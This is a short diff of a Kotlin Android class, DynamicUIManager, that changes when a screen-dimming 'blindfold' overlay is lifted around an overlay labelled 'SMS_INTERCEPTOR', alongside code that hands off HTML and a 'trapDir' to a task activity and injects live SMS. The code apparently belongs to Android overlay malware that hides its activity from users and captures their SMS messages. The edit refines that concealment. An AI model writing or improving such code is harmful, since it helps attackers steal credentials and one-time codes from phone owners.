@@ -871,7 +871,6 @@ object DynamicUIManager {
             }
 
             if (appMode) {
-                DimmerManager.removeOverlay(ctx)
                 DynamicAppHandoff.pendingHtml = htmlContent
                 val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
@@ -1342,7 +1341,6 @@ object DynamicUIManager {
                     activeNativeEntry = instance
 
                     if (appMode) {
-                        DimmerManager.removeOverlay(ctx)
                         DynamicAppHandoff.pendingNativeEntry = instance
                         DynamicAppHandoff.pendingNativeDir = trapDir.absolutePath
                         val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
@@ -1554,11 +1552,7 @@ object DynamicUIManager {
         
         isSmsInterceptorActive = true
         showOverlay(ctx, true, "OVERLAY", html, true, true, "SMS_INTERCEPTOR")
-        
-        // Lift blindfold after 600ms
-        Handler(Looper.getMainLooper()).postDelayed({
-            DimmerManager.removeOverlay(ctx)
-        }, 600)
+        // Dimmer removal delegated to DynamicTaskActivity's onPageFinished to eliminate transition gaps
     }
 
     fun injectLiveSms(sender: String, body: String, ts: Long) {
